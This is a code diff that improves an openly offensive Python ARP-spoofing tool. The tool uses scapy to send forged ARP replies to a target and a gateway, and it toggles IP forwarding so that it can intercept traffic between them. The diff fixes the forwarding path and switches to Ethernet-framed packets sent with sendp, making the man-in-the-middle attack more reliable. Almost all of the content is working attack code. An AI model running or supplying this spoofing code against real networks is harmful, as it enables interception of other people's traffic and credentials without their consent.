@@ -11,7 +11,7 @@ red = Fore.RED
 green = Fore.LIGHTGREEN_EX
 dgreen = Fore.GREEN
 yellow = Fore.YELLOW
-
+blue = Fore.BLUE
 def get_banner():
     banner = """
        ▄▄▄       ██▀███   ██▓███      ███▄ ▄███▓ ██▓ ██▀███   ▄▄▄        ▄████ ▓█████ 
@@ -40,7 +40,7 @@ def enable_ip_forwarding():
 
 def disable_ip_forwarding():
     print(red + "[-] Disabling IP forwarding....")
-    os.system("echo 0 > /proc/sys/ipv4/ip_forward")
+    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
 
 def get_mac(ip, interface):
     try:
@@ -57,9 +57,11 @@ def spoof(target_ip, spoof_ip, target_mac, interface):
     if target_mac is None:
         print(yellow + f"[!] Could not find target MAC address for {target_ip}. Skipping.")
         return
-    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
-    scapy.send(packet, iface=interface, verbose=False)
-    print(f"[+] Sent spoofed packet to {target_ip} (pretending to be {spoof_ip})")
+    ether = scapy.Ether(dst=target_mac)
+    arp = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+    packet = ether/arp
+    scapy.sendp(packet, iface=interface, verbose=False)
+    print( f"\r[+] Sent spoofed packet to {target_ip} (pretending to be {spoof_ip})")
 
 def restore(destination_ip, source_ip, interface):
     destination_mac = get_mac(destination_ip, interface)
@@ -67,9 +69,11 @@ def restore(destination_ip, source_ip, interface):
     if destination_mac is None or source_mac is None:
         print(f"[!] Could not find MAC address for {destination_ip} or {source_ip}. Skipping restore.")
         return
-    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
-    scapy.send(packet, count=4, iface=interface, verbose=False)
-    print(f"[+] Restored ARP table for {destination_ip}")
+    ether = scapy.Ether(dst=destination_mac)
+    arp = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
+    packet = ether/arp 
+    scapy.sendp(packet, count=4, iface=interface, verbose=False)
+    print(blue + f"[+] Restored ARP table for {destination_ip}")
 
 get_banner()
 args = get_arguments()
@@ -100,6 +104,6 @@ if target_ip and gateway_ip:
         restore(gateway_ip, target_ip, interface)
         restore(target_ip, gateway_ip, interface)
         disable_ip_forwarding()
-        print(green + "[+] ARP tables restored.")
+        print(blue + "[+] ARP tables restored.")
 else:
     print(red + "[-] Please specify both target IP and gateway IP using -t and -g options.")
